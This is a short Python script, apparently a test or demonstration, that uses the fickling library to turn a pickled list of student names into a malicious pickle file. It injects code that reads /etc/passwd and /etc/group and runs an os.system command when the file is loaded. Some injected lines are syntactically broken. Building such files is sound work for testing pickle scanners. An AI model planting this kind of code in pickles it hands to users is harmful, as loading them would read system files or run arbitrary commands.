import subprocess
import sys
from fickling.pickle import Pickled
import pickle
# Create a malicious pickle
student_names = ['Alice','Bob','Elena','Jane','Kyle']
pickle_bin = pickle.dumps(student_names)
p = Pickled.load(pickle_bin)
p.insert_python_exec("with open('/etc/passwd','r') as r: print(r.readlines())")
p.insert_python_exec("with open('/etc/group','r') as r: print(r.readlines())")
p.insert_python_exec("import module print('malicious')")
p.insert_python_exec("import os  os.system('echo Malicious code!')")

with open('unsafe.pkl', 'wb') as f:

    p.dump(f)

